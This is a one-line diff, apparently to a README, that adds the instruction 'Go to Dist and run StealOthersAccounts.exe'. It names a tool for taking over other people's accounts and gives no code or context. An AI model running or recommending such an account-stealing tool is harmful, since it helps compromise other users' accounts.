@@ -1,0 +1,1 @@
+Go to Dist and run StealOthersAccounts.exe
